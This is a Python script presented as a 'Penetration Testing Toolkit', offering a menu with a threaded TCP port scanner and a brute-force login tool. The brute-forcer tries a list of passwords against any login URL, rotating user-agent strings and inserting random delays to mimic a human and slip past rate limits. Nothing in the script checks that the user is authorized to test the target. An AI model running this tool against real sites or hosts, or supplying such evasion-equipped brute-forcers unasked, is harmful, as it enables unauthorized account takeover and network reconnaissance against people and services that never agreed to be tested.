import os
import requests
import time
import random
import socket
import threading

# Utility to clear the console
def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

# Banner display
def banner():
    print("╔════════════════════════════════════════════╗")
    print("        ⚡ Penetration Testing Toolkit ⚡    ")
    print("╚════════════════════════════════════════════╝")

# Random user-agent generator for brute force login
def random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36"
    ]
    return random.choice(user_agents)

# Brute force login function
def brute_force_login():
    clear_console()
    print("★ Brute Force Login ★\n")
    url = input("Enter the login URL: ").strip()
    username = input("Enter the username: ").strip()
    password_list = input("Enter passwords separated by commas: ").strip().split(',')

    session = requests.Session()
    failed_attempts = []

    for password in password_list:
        password = password.strip()
        print(f"Trying password: {password}")
        headers = {'User-Agent': random_user_agent()}
        payload = {'username': username, 'password': password}

        try:
            response = session.post(url, data=payload, headers=headers)
            if "Login successful" in response.text:  # Adjust this condition based on server response
                print(f"✔ Password found: {password}")
                return
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

        failed_attempts.append(password)
        time.sleep(random.uniform(1, 3))  # Simulate human behavior

    print("✘ Password not found.")
    if failed_attempts:
        with open("failed_attempts.txt", "w") as f:
            f.writelines(f"{pwd}\n" for pwd in failed_attempts)
        print("Failed attempts saved to 'failed_attempts.txt'.")

# Port scanner function
def scan_port(target, port, open_ports):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        if s.connect_ex((target, port)) == 0:
            open_ports.append(port)
        s.close()
    except socket.error:
        pass

def port_scanner():
    clear_console()
    print("★ Port Scanner ★\n")
    target = input("Enter the target IP or domain: ").strip()
    start_port = int(input("Enter the starting port: "))
    end_port = int(input("Enter the ending port: "))

    print(f"\nScanning {target} for ports {start_port}-{end_port}...")
    threads = []
    open_ports = []

    for port in range(start_port, end_port + 1):
        thread = threading.Thread(target=scan_port, args=(target, port, open_ports))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    if open_ports:
        print("\n✔ Open Ports:")
        for port in open_ports:
            print(f"  - Port {port} is OPEN")
    else:
        print("✘ No open ports found.")

# Main menu
def main_menu():
    while True:
        clear_console()
        banner()
        print("1. Port Scanner")
        print("2. Brute Force Login")
        print("3. Exit")
        choice = input("\nSelect an option (1–3): ").strip()

        if choice == "1":
            port_scanner()
        elif choice == "2":
            brute_force_login()
        elif choice == "3":
            print("\n✨ Exiting Toolkit. Stay safe! ✨")
            break
        else:
            print("✘ Invalid choice! Please try again.")
        input("\nPress Enter to return to the main menu...")

if __name__ == "__main__":
    main_menu()
